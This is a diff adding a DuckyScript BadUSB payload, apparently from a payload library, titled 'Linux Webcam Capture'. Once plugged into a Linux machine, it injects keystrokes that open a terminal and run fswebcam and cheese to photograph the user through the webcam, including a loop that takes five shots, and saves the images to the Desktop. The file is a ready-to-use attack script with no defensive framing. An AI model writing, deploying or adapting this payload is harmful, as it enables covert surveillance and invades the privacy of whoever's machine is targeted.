@@ -1,0 +1,29 @@
+REM Title: Linux Webcam Capture
+REM Author: BadUSB Library
+REM Description: Captures photos using webcam
+REM Target: Linux
+REM Category: Collection
+REM Type: Directly Ready
+
+REM Open Terminal
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Terminal
+ENTER
+DELAY 3000
+
+REM Capture webcam photo
+STRING fswebcam ~/Desktop/webcam_photo_$(date +%Y%m%d_%H%M%S).jpg
+ENTER
+DELAY 3000
+
+REM Alternative with cheese
+STRING cheese --capture ~/Desktop/cheese_photo_$(date +%Y%m%d_%H%M%S).jpg
+ENTER
+DELAY 3000
+
+REM Multiple photos
+STRING for i in {1..5}; do fswebcam ~/Desktop/webcam_$i.jpg; sleep 2; done
+ENTER
+DELAY 10000
